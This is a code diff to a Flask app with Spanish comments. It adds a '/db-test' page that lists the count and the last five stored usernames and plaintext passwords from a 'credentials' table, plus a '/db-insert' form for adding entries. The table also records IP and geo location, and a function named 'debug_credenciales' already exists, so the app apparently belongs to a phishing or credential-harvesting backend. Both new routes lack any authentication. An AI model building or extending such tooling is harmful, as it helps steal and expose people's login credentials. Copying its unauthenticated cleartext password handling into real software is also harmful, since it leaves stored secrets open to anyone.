@@ -1030,6 +1030,67 @@ def debug_credenciales():
     except Exception as e:
         return f"❌ Error: {e}"
 
+@app.route('/db-test')
+def db_test():
+    """Ruta para probar la base de datos desde el navegador"""
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        
+        # Ver cuántas credenciales hay
+        cursor.execute('SELECT COUNT(*) FROM credentials')
+        count = cursor.fetchone()[0]
+        
+        # Obtener las últimas 5
+        cursor.execute('SELECT id, username, password, timestamp FROM credentials ORDER BY id DESC LIMIT 5')
+        rows = cursor.fetchall()
+        conn.close()
+        
+        html = f"<h1>📊 Base de datos</h1>"
+        html += f"<p>Total de credenciales: <strong>{count}</strong></p>"
+        
+        if rows:
+            html += "<h2>Últimas 5 credenciales:</h2>"
+            html += "<table border='1' cellpadding='5'>"
+            html += "<tr><th>ID</th><th>Usuario</th><th>Contraseña</th><th>Fecha</th></tr>"
+            for r in rows:
+                html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>"
+            html += "</table>"
+        else:
+            html += "<p>No hay credenciales en la base de datos.</p>"
+        
+        # Agregar un formulario para insertar manualmente
+        html += """
+        <h2>Insertar credencial de prueba</h2>
+        <form method="POST" action="/db-insert">
+            <input type="text" name="username" placeholder="Usuario" required>
+            <input type="text" name="password" placeholder="Contraseña" required>
+            <button type="submit">Guardar</button>
+        </form>
+        """
+        return html
+    except Exception as e:
+        return f"❌ Error: {e}"
+
+@app.route('/db-insert', methods=['POST'])
+def db_insert():
+    """Insertar credencial manualmente"""
+    try:
+        username = request.form.get('username', '')
+        password = request.form.get('password', '')
+        
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO credentials (timestamp, ip, username, password, geo_location)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (datetime.now().isoformat(), '127.0.0.1', username, password, 'Test, Location'))
+        conn.commit()
+        conn.close()
+        return f"✅ Credencial guardada: {username} / {password}"
+    except Exception as e:
+        return f"❌ Error: {e}"
+
 if __name__ == '__main__':
     load_config()
     init_db()
